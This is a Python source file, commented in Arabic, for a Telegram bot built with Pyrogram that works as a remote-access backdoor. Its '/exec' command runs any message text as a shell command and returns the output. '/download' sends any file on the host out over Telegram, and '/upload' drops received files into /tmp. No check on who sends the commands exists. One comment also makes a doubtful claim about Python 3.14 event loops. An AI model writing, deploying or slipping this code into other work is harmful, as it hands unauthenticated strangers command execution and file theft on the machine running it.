import asyncio
import os
from pyrogram import Client as PyroClient

# ====== حل مشكلة event loop ======
# في Python 3.14، يجب إنشاء حلقة أحداث صراحة
try:
    asyncio.get_running_loop()
except RuntimeError:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

# ====== تكوين البوت ======
API_ID = os.getenv('API_ID', 'your_api_id')
API_HASH = os.getenv('API_HASH', 'your_api_hash')
BOT_TOKEN = os.getenv('BOT_TOKEN', 'your_bot_token')
SESSION_NAME = 'session_bot'

# ====== إنشاء العميل ======
app = PyroClient(
    SESSION_NAME,
    api_id=int(API_ID),
    api_hash=API_HASH,
    bot_token=BOT_TOKEN
)

# ====== دالة بدء التشغيل ======
async def main():
    await app.start()
    print(f"Bot @{app.me.username} started successfully!")
    
    # معلومات البوت
    print(f"User ID: {app.me.id}")
    print(f"Name: {app.me.first_name}")
    
    # استقبال الأوامر
    @app.on_message()
    async def handle_message(client, message):
        if message.text:
            print(f"Received: {message.text}")
            
            # أوامر التحكم
            if message.text.startswith('/exec'):
                # تنفيذ أوامر شل
                cmd = message.text.replace('/exec', '').strip()
                import subprocess
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                await message.reply(f"```\n{result.stdout}\n{result.stderr}\n```")
            
            elif message.text.startswith('/download'):
                # تحميل ملف من الجهاز
                file_path = message.text.replace('/download', '').strip()
                if os.path.exists(file_path):
                    await message.reply_document(file_path)
                else:
                    await message.reply(f"File {file_path} not found")
            
            elif message.text.startswith('/upload'):
                # استقبال ملف وتنفيذه
                if message.document:
                    file_path = f"/tmp/{message.document.file_name}"
                    await client.download_media(message.document, file_path)
                    await message.reply(f"File saved to {file_path}")
    
    # البقاء متصلاً إلى الأبد
    await asyncio.Event().wait()

# ====== تشغيل البوت ======
if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nBot stopped")
